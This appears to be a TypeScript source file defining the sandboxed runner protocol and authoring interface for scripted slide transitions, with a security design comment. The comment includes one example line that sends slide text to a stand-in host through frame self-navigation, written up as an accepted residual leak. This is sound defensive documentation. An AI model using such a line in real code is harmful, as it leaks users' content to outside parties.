// SCRIPTED TRANSITIONS: the message protocol between the presenter (host) and the sandboxed
// transition runner, the limits the host enforces, and the interface a transition is written
// against. Claude writes transitions as JavaScript against `TransitionAuthoringGlobal`.
//
// TWO HOSTS, ONE AUTHORING INTERFACE. The five built-ins (fade, push, slide, zoom, morph) are our
// own TypeScript `TransitionDefinition`s and run IN THE PRESENTER'S PAGE with Web Animations: no
// serialising, no second site, nothing to wait for on every Next press. Only SCRIPTED transitions
// go through the sandboxed runner. Both hosts hand a script the same `TransitionContext`, so a
// built-in also runs in the runner -- one integration test does exactly that, to exercise the
// protocol. Under reduced motion the host substitutes a 150 millisecond in-page fade for a
// scripted transition instead of trusting the script to honour `reducedMotion`.
//
// THE SECURITY BOUNDARY IS THE FRAME, not the script. A transition is arbitrary code, possibly
// written by a model from a prompt someone else controls, so:
//
//  * The runner is an `<iframe sandbox="allow-scripts">` -- never `allow-same-origin`,
//    `allow-popups`, `allow-forms`, `allow-modals` or `allow-top-navigation` -- which gives it an
//    OPAQUE origin: no cookies, no storage, no access to the editor's page, the Y.Doc or the user's
//    session. It also gets `allow=""` (no powerful features), `referrerpolicy="no-referrer"` and
//    `inert`: it can never take focus or pointer input, so it cannot read keystrokes or be clicked
//    while it draws a convincing fake sign-in page full screen.
//  * The runner page is served with `Content-Security-Policy: default-src 'none'; script-src 'self'
//    blob:; style-src 'unsafe-inline' blob:; img-src blob: data:; font-src blob: data:` and no
//    `connect-src`: no network at all, which is why slides arrive as markup and assets and fonts as
//    bytes.
//  * Only APPROVED scripts run (document.ts `TransitionApproval`); an unapproved one is replaced by
//    an in-page fade with a notice inviting a person to review it.
//  * RESIDUAL LEAK, accepted and documented: a sandboxed frame can still navigate ITSELF
//    (`location = "https://elsewhere/?" + slideText`), and no content security policy directive can
//    forbid that any more (`navigate-to` was removed from the standard). That channel only reaches
//    whoever wrote the script, which an approval has vouched for. The host counts the frame's
//    `load` events and ends the run with `runnerNavigated` on a second one.
//
// A HUNG SCRIPT MUST NOT FREEZE THE EDITOR. The runner is served from a DIFFERENT SITE than the
// editor (milestone 1 demo: editor on 127.0.0.1, runner on localhost; production: a separate
// registrable domain), so the browser's site isolation runs it in another process and the host's
// timers keep firing while a `while (true) {}` spins. The host never trusts the script to finish:
// it PINGS the runner over the `MessagePort` every `pingIntervalMilliseconds`, and the runner
// bootstrap (our code) answers each ping from its message handler -- a blocked main thread cannot.
// A ping unanswered for `stallTimeoutMilliseconds` is a stall. Animation frames are NOT the
// heartbeat: browsers stop them for hidden and occluded windows, which would cut a healthy
// transition whenever the speaker view covers the audience window. Deadlines only count while
// the host page is VISIBLE (a background tab's timers are throttled to about one per second).
//
// THE CHANNEL. The runner announces itself once with `runnerReady` via `window.postMessage`; the
// host checks `event.source` is the runner frame's `contentWindow` and `event.origin` is "null"
// (opaque), then transfers one end of a `MessageChannel` in `connect`. Everything after travels
// on that port, which only the host holds the other end of. Every message is parsed and its
// `runId` checked; anything else is dropped and counted.

import type { AssetMediaType, BuiltinTransitionName } from "./document.ts";
import type { Box, Frame } from "./geometry.ts";
import type { AssetId } from "./ids.ts";
import type { SlideMarkup } from "./render.ts";
import type { SerialisableObject } from "./serialisable.ts";

export const TRANSITION_PROTOCOL = "sasha-transition/2";

// The limits live in a DOM-free file of their own so the connector (ES2022, no DOM library) can
// import them; this file re-exports them for every existing importer.
export { TRANSITION_LIMITS } from "./transition-limits.ts";

export type TransitionDirection = "forward" | "backward";

export type TransferredAsset = Readonly<{ assetId: AssetId; mediaType: AssetMediaType; bytes: ArrayBuffer }>;

export type TransferredFont = Readonly<{ family: string; weight: number; style: "normal" | "italic"; bytes: ArrayBuffer }>;

/** A scripted transition as the runner receives it (document.ts `TransitionScriptRecord`'s sources). */
export type TransitionScriptBundle = Readonly<{
  /** JavaScript calling `sashaTransition.define(...)`. */
  script: string;
  stylesheet: string;
  markup: string;
}>;

/** Sent with `window.postMessage` (the only two messages that are). */
export type RunnerAnnouncement = Readonly<{ protocol: typeof TRANSITION_PROTOCOL; kind: "runnerReady" }>;
export type HostConnect = Readonly<{ protocol: typeof TRANSITION_PROTOCOL; kind: "connect" }>;

/** Host to runner, on the port. */
export type HostToRunnerMessage =
  | Readonly<{
      protocol: typeof TRANSITION_PROTOCOL;
      kind: "prepare";
      runId: string;
      bundle: TransitionScriptBundle;
      /** null when the show starts (transition in from black). */
      outgoing: SlideMarkup | null;
      incoming: SlideMarkup;
      /** In the transfer list: fresh copies (document-store.ts `copyBytesOf`). */
      assets: readonly TransferredAsset[];
      fonts: readonly TransferredFont[];
      pageHeight: number;
      durationMilliseconds: number;
      direction: TransitionDirection;
      parameters: SerialisableObject;
      reducedMotion: boolean;
    }>
  | Readonly<{ protocol: typeof TRANSITION_PROTOCOL; kind: "start"; runId: string }>
  | Readonly<{ protocol: typeof TRANSITION_PROTOCOL; kind: "cancel"; runId: string; reason: TransitionCancelReason }>
  | Readonly<{ protocol: typeof TRANSITION_PROTOCOL; kind: "ping"; runId: string; sequence: number }>;

export type TransitionCancelReason = "skippedByPresenter" | "superseded" | "presentationEnded";

/** Runner to host, on the port. */
export type RunnerToHostMessage =
  /** Fonts and images decoded, both slides in the stage, the script defined itself. */
  | Readonly<{ protocol: typeof TRANSITION_PROTOCOL; kind: "prepared"; runId: string }>
  | Readonly<{ protocol: typeof TRANSITION_PROTOCOL; kind: "started"; runId: string }>
  /** The answer to `ping`; `progress` is elapsed / duration, 0..1. */
  | Readonly<{ protocol: typeof TRANSITION_PROTOCOL; kind: "pong"; runId: string; sequence: number; progress: number }>
  | Readonly<{ protocol: typeof TRANSITION_PROTOCOL; kind: "finished"; runId: string }>
  | Readonly<{ protocol: typeof TRANSITION_PROTOCOL; kind: "failed"; runId: string; stage: "define" | "prepare" | "run"; message: string }>
  | Readonly<{ protocol: typeof TRANSITION_PROTOCOL; kind: "log"; runId: string; level: "information" | "warning" | "error"; message: string }>;

/** Why a run ended without the animation completing; the presenter then cuts to the incoming slide. */
export type TransitionFallbackReason =
  | "runnerNotReady"
  | "prepareTimedOut"
  | "stalled"
  | "overran"
  | "scriptFailed"
  | "scriptTooLarge"
  /** One slide's markup is over `maximumSlideMarkupBytes`. */
  | "slideTooLarge"
  /** The images and fonts of the run together are over `maximumTransferredBytes`. */
  | "transferTooLarge"
  /** The host could not build the prepare message: rendering a slide, reading fonts, or cloning a buffer threw. */
  | "hostPrepareFailed"
  | "runnerNavigated"
  | "protocolViolation";

/** Why the host played its own fade instead of the slide's transition (not a failure; noted in diagnostics). */
export type TransitionSubstitutionReason = "reducedMotion" | "scriptNotApproved" | "scriptMissing";

/** The built-ins as definitions, keyed by effect: the presenter's in-page host runs these. */
export type BuiltinTransitionDefinitions = Readonly<Record<BuiltinTransitionName, TransitionDefinition>>;

// ----------------------------------------------------------------------------------------------
// The authoring interface: what exists for a transition, in the runner or in-page. These types are
// published to Claude (SPEC.md "Writing a transition") as the reference for writing one.
// ----------------------------------------------------------------------------------------------

/** The global `sashaTransition` inside the runner. */
export interface TransitionAuthoringGlobal {
  /** Call exactly once, synchronously, from the script. */
  define(definition: TransitionDefinition): void;
}

export interface TransitionDefinition {
  name: string;
  /**
   * Animate from `context.outgoing` to `context.incoming`. Resolve when done. Throwing or
   * rejecting fails the run (the presenter cuts). Must respect `context.signal`.
   */
  run(context: TransitionContext): Promise<void> | void;
}

export interface TransitionContext {
  /** Both slides stacked inside, scaled to fit the viewport; slide units inside. */
  readonly stage: HTMLElement;
  /** The outgoing slide's root (above the incoming one), or null when starting from black. */
  readonly outgoing: HTMLElement | null;
  /** The incoming slide's root, fully rendered, initially visible beneath `outgoing`. */
  readonly incoming: HTMLElement;
  /** The bundle's `markup`, in a layer above both slides. */
  readonly overlay: HTMLElement;
  readonly durationMilliseconds: number;
  readonly direction: TransitionDirection;
  readonly parameters: SerialisableObject;
  /** True when the viewer prefers reduced motion: a script should fade or cut, not fly. */
  readonly reducedMotion: boolean;
  /** Aborted when the presenter skips ahead or the run times out. */
  readonly signal: AbortSignal;
  /** Leaf elements of one side, z-order back to front (groups are wrappers, render.ts). */
  elements(side: "outgoing" | "incoming"): readonly StageElementHandle[];
  /** Leaves present on both slides with the same morph key: the morph transition's input. */
  pairs(): readonly MorphPair[];
  /** Web Animations, cancelled automatically on abort and clamped to the remaining time. */
  animate(node: Element, keyframes: Keyframe[] | PropertyIndexedKeyframes, options: KeyframeAnimationOptions): Animation;
  /** Resolves after `milliseconds`, rejects on abort. */
  wait(milliseconds: number): Promise<void>;
}

export interface StageElementHandle {
  readonly elementId: string;
  readonly morphKey: string;
  readonly kind: string;
  /**
   * The UNROTATED frame. To morph, interpolate x, y, width and height of this and `rotation`
   * separately: mapping rotated `bounds` onto rotated `bounds` while the node also rotates would
   * count the rotation twice.
   */
  readonly frame: Frame;
  /** Rotated bounds in slide units. */
  readonly bounds: Box;
  readonly node: HTMLElement;
}

export interface MorphPair {
  readonly morphKey: string;
  readonly outgoing: StageElementHandle;
  readonly incoming: StageElementHandle;
}

/** Parse-boundary check of the envelope fields (the presenter validates the rest per kind). */
export function hasTransitionProtocol(candidate: unknown): candidate is Readonly<{ protocol: typeof TRANSITION_PROTOCOL; kind: string }> {
  if (typeof candidate !== "object" || candidate === null) return false;
  const protocol: unknown = Reflect.get(candidate, "protocol");
  const kind: unknown = Reflect.get(candidate, "kind");
  return protocol === TRANSITION_PROTOCOL && typeof kind === "string";
}
